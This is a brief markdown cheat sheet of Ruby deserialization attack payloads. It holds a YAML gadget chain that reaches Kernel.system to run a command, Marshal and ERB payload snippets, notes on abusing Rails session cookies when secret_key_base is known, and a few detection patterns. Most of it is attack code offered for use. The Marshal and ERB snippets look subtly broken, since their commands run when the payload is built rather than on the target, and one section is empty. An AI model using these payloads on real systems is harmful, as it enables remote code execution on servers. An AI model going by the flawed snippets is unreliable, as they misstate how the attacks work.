# Ruby Deserialization

## 1. Ruby Marshal RCE
```ruby
require 'base64'

class Gem::Requirement
  def marshal_dump
    [`id`]
  end
end

payload = Marshal.dump(Gem::Requirement.new)
puts Base64.encode64(payload)
```

## 2. ERB Template Injection
```ruby
class Gem::Specification
  def marshal_dump
    ERB.new('<%= `id` %>').result
  end
end

payload = Marshal.dump(Gem::Specification.new)
puts Base64.encode64(payload)
```

## 3. YAML Deserialization
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

## 4. Rails Deserialization
```ruby
# Rails uses Marshal for session cookies
# If secret_key_base is known
require 'cgi'
cookie = CGI.unescape("cookie_value")
data = Marshal.load(Base64.decode64(cookie))
```

## 5. Rails Cookie Deserialization
```ruby
# Decrypt and deserialize
# If secret_key_base known
```

## Detection
```bash
# Look for Marshal header: \x04\x08
# Look for YAML with !ruby/object
# Look for Base64 starting with BAh (Marshal header in base64)
```
